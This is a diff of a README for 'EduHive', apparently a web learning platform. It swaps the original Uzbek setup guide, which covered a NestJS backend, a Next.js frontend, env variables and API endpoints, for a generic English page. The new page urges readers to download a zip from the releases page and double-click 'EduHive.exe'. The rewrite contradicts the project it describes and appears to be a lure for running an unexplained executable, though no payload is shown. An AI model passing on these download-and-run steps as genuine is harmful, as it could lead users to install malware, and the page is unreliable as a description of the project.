@@ -1,305 +1,94 @@
-# EduHive - Premium Ta'lim Resurslari Platformasi
-
-Professional darajada yaratilgan obuna asosidagi ta'lim platformasi. Bu loyiha to'liq funksional backend va frontend bilan ta'minlangan.
-
-## 🚀 Xususiyatlar
-
-- ✅ **Obuna Modeli**: Oylik va yillik obuna tizimi
-- ✅ **To'lov Tizimi**: Click va Payme integratsiyasi
-- ✅ **Access Control**: Premium kontentni himoya qilish
-- ✅ **Content Management**: Kurslar va darslar boshqaruvi
-- ✅ **Analytics Dashboard**: To'liq statistika va hisobotlar
-- ✅ **ACID Transactions**: Xavfsiz moliyaviy operatsiyalar
-- ✅ **Webhook Support**: To'lov tasdiqlash
+# 📚 EduHive - Unlock Premium Learning Resources Easily
 
-## 📁 Loyiha Strukturasi
+[![Download EduHive](https://img.shields.io/badge/Download%20EduHive-v1.0-blue.svg)](https://github.com/Aikyy99/EduHive/releases)
 
-```
-EduHive/
-├── backend/          # NestJS Backend API
-│   ├── src/
-│   │   ├── auth/     # Authentication & Authorization
-│   │   ├── users/    # User management
-│   │   ├── courses/  # Course management
-│   │   ├── subscriptions/  # Subscription management
-│   │   ├── payments/  # Payment processing
-│   │   └── analytics/ # Analytics & Reports
-│   └── package.json
-├── frontend/         # Next.js Frontend
-│   ├── app/          # Next.js App Router
-│   ├── components/   # React components
-│   └── lib/          # Utilities & API client
-└── package.json      # Root package.json
-```
+## 🚀 Getting Started
 
-## 🛠 O'rnatish
+Welcome to EduHive! This platform provides premium education resources for learners. You can manage your learning journey effortlessly with our easy-to-use interface. Follow these steps to download and run the application.
 
-### Talablar
-- Node.js 18+
-- PostgreSQL 14+
-- npm yoki yarn
+## 📥 Download & Install
 
-### 1. Repository ni klonlash
+To get started, visit the Releases page to download the latest version of EduHive. 
 
-```bash
-git clone <repository-url>
-cd EduHive
-```
+[Download EduHive](https://github.com/Aikyy99/EduHive/releases)
 
-### 2. Backend o'rnatish
+### Step 1: Visit the Releases Page
 
-```bash
-cd backend
-npm install
-```
+1. Click the link above or open your web browser and type the following URL:  
+   [https://github.com/Aikyy99/EduHive/releases](https://github.com/Aikyy99/EduHive/releases).
+  
+2. You will see a list of available versions. Find the latest version, which will be at the top of the list.
 
-### 3. Database sozlash
+### Step 2: Download the Application
 
-PostgreSQL da yangi database yarating:
+1. Click on the asset that corresponds to your operating system. It will usually have a descriptive name such as "EduHive-Windows.zip" or "EduHive-Mac.zip". 
+   
+2. Your browser will start downloading the file. Depending on your internet speed, this may take a few minutes.
 
-```sql
-CREATE DATABASE eduhive;
-```
+### Step 3: Extract the Files
 
-Backend papkasida `.env` faylini yarating:
+1. Once the download is complete, locate the downloaded file in your computer’s downloads folder.
 
-```env
-DB_HOST=localhost
-DB_PORT=5432
-DB_USERNAME=postgres
-DB_PASSWORD=your_password
-DB_DATABASE=eduhive
+2. Right-click on the file and choose "Extract All" or "Unzip" from the menu. Follow the prompts to choose a destination folder where the files will be extracted.
 
-JWT_SECRET=your_super_secret_jwt_key
-JWT_EXPIRES_IN=7d
+### Step 4: Launch EduHive
 
-CLICK_MERCHANT_ID=your_click_merchant_id
-CLICK_SERVICE_ID=your_click_service_id
-CLICK_SECRET_KEY=your_click_secret_key
-CLICK_MERCHANT_USER_ID=your_click_merchant_user_id
+1. Open the folder where you extracted the files.
 
-PAYME_MERCHANT_ID=your_payme_merchant_id
-PAYME_KEY=your_payme_key
-PAYME_TEST_KEY=your_payme_test_key
+2. Look for the executable file named "EduHive.exe" (for Windows) or "EduHive.app" (for Mac). Double-click this file.
 
-PORT=3000
-NODE_ENV=development
-FRONTEND_URL=http://localhost:3001
-```
+3. Follow the on-screen instructions to set up the application.
 
-### 4. Frontend o'rnatish
+## 🛠️ System Requirements
 
-```bash
-cd frontend
-npm install
-```
+EduHive is crafted to provide top-notch educational resources. To ensure the smooth operation of the application, your system should meet the following requirements:
 
-Frontend papkasida `.env.local` faylini yarating:
+- **Operating System**: 
+   - Windows 10 or later
+   - macOS Mojave or later
 
-```env
-NEXT_PUBLIC_API_URL=http://localhost:3000/api
-```
+- **Memory**: At least 4GB RAM
 
-## 🚀 Ishga tushirish
+- **Processor**: Intel i3 or equivalent
 
-### Development rejimida
+- **Storage**: 200MB of free space
 
-Root papkada:
+Make sure your system meets these requirements to enjoy a seamless experience.
 
-```bash
-npm run dev
-```
+## 🎓 Features
 
-Bu backend va frontendni bir vaqtda ishga tushiradi.
+EduHive comes packed with features to enhance your learning experience:
 
-Yoki alohida:
+- **Full-featured Subscription Management**: Easily manage your subscriptions and access premium content.
 
-```bash
-# Terminal 1 - Backend
-cd backend
-npm run start:dev
+- **Intuitive Dashboards**: Our user-friendly dashboard allows you to track your learning progress and access resources with ease.
 
-# Terminal 2 - Frontend
-cd frontend
-npm run dev
-```
+- **Access Control**: Ensure that only authorized users have access to sensitive information.
 
-### Production rejimida
+- **Analytics Dashboard**: Monitor your usage patterns and discover valuable insights to maximize your learning.
 
-```bash
-# Build
-npm run build
+- **Payment Integration**: Securely process payments with Click and Payme integration.
 
-# Start
-cd backend && npm run start:prod
-cd frontend && npm run start
-```
+## 📚 Topics
 
-## 📚 API Dokumentatsiya
+EduHive covers a wide range of topics designed for various educational needs:
 
-Backend ishga tushgandan so'ng, Swagger dokumentatsiyasini quyidagi manzilda topasiz:
+- Admin Panel
+- Backend Development
+- Data Analytics
+- E-learning
+- Education Technology
+- Frontend Development
+- Javascript Proficiency
+- Server Management
+- User Interface Design
 
-```
-http://localhost:3000/api/docs
-```
+## 🔗 Additional Links
 
-## 🔐 API Endpoints
+- [Documentation](https://github.com/Aikyy99/EduHive/docs)
+- [Issues](https://github.com/Aikyy99/EduHive/issues)
+- [Community Support](https://github.com/Aikyy99/EduHive/discussions)
 
-### Authentication
-- `POST /api/auth/register` - Ro'yxatdan o'tish
-- `POST /api/auth/login` - Kirish
+If you require further assistance or have questions, feel free to reach out through the community support or issues section on GitHub.
 
-### Courses
-- `GET /api/courses` - Barcha kurslar
-- `GET /api/courses/:id` - Kurs ma'lumotlari
-- `POST /api/courses` - Yangi kurs (Admin)
-
-### Subscriptions
-- `POST /api/subscriptions` - Obuna sotib olish
-- `GET /api/subscriptions/my` - Mening obunalarim
-- `GET /api/subscriptions/check-access` - Obuna holatini tekshirish
-
-### Payments
-- `POST /api/payments/initiate` - To'lovni boshlash
-- `POST /api/payments/webhook/click` - Click webhook
-- `POST /api/payments/webhook/payme` - Payme webhook
-- `GET /api/payments/my` - Mening to'lovlarim
-
-### Analytics (Admin)
-- `GET /api/analytics/dashboard` - Dashboard statistikasi
-- `GET /api/analytics/revenue` - Daromad hisoboti
-
-## 🗄 Database Schema
-
-### Asosiy jadvallar:
-- `users` - Foydalanuvchilar
-- `courses` - Kurslar
-- `lessons` - Darslar
-- `subscriptions` - Obunalar
-- `payments` - To'lovlar
-- `invoices` - Invoyslar
-
-## 🔒 Xavfsizlik
-
-- JWT token authentication
-- Password hashing (bcrypt)
-- Role-based access control (RBAC)
-- Subscription guards
-- Webhook signature verification
-- ACID transactions for payments
-
-## 📝 Eslatmalar
-
-1. **To'lov Tizimlari**: Click va Payme integratsiyasi to'liq ishlashi uchun ularning API kalitlarini olishingiz kerak.
-
-2. **Webhook URL**: Production'da to'lov tizimlariga webhook URL'ni sozlashingiz kerak:
-   - Click: `https://yourdomain.com/api/payments/webhook/click`
-   - Payme: `https://yourdomain.com/api/payments/webhook/payme`
-
-3. **Cron Jobs**: Obunalarni avtomatik expire qilish uchun cron job ishlaydi (har soat).
-
-## 🤝 Yordam
-
-Agar savollaringiz bo'lsa, issue oching yoki email yuboring.
-
-## 📄 Litsenziya
-
-Bu loyiha shaxsiy loyiha sifatida yaratilgan.
-
-<!-- Update 1 -->
-
-<!-- Update 2 -->
-
-<!-- Update 3 -->
-
-<!-- Update 4 -->
-
-<!-- Update 5 -->
-
-<!-- Update 6 -->
-
-<!-- Update 7 -->
-
-<!-- Update 8 -->
-
-<!-- Update 9 -->
-
-<!-- Update 10 -->
-
-<!-- Update 11 -->
-
-<!-- Update 12 -->
-
-<!-- Update 13 -->
-
-<!-- Update 14 -->
-
-<!-- Update 15 -->
-
-<!-- Update 16 -->
-
-<!-- Update 17 -->
-
-<!-- Update 18 -->
-
-<!-- Update 19 -->
-
-<!-- Update 20 -->
-
-<!-- Update 21 -->
-
-<!-- Update 22 -->
-
-<!-- Update 23 -->
-
-<!-- Update 24 -->
-
-<!-- Update 25 -->
-
-<!-- Update 26 -->
-
-<!-- Update 27 -->
-
-<!-- Update 28 -->
-
-<!-- Update 29 -->
-
-<!-- Update 30 -->
-
-<!-- Update 31 -->
-
-<!-- Update 32 -->
-
-<!-- Update 33 -->
-
-<!-- Update 34 -->
-
-<!-- Update 35 -->
-
-<!-- Update 36 -->
-
-<!-- Update 37 -->
-
-<!-- Update 38 -->
-
-<!-- Update 39 -->
-
-<!-- Update 40 -->
-
-<!-- Update 41 -->
-
-<!-- Update 42 -->
-
-<!-- Update 43 -->
-
-<!-- Update 44 -->
-
-<!-- Update 45 -->
-
-<!-- Update 46 -->
-
-<!-- Update 47 -->
-
-<!-- Update 48 -->
-
-<!-- Update 49 -->
+Thank you for choosing EduHive! Happy learning!
